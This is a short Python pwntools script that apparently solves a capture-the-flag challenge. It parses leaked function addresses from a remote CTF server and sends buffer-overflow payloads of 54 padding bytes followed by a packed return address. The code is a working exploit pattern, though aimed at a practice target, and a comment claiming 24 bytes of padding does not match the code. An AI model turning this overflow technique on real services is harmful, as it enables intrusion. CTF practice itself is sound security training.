from pwn import *
import re
import time

def send_rop_payload(address):
    conn = remote('3-bh02.bootupctf.net', 8221)

    try:
        while True:
            response = conn.recvline().decode()
            print(response)

            # Match the pattern for function addresses
            match = re.search(r"Fn \d: (0x[0-9a-fA-F]+)", response)
            if match:
                function_address = match.group(1)
                print("Function Address:", function_address)

                # Convert the function address to a 32-bit little-endian format
                rop_payload = p32(int(function_address, 16))
                print("ROP Payload:", rop_payload.hex())

                # Add 24 bytes before the payload
                payload = b'A' * 54 + rop_payload

                # Send the payload
                conn.sendline(payload)
                response = conn.recvline().decode()
                print("Received:", response)

            if "Well?" in response:
                break

            time.sleep(1)  # Delay between each iteration

    except KeyboardInterrupt:
        print("Stopping the loop...")

    finally:
        conn.close()

address = r"0x[0-9a-fA-F]+"
send_rop_payload(address)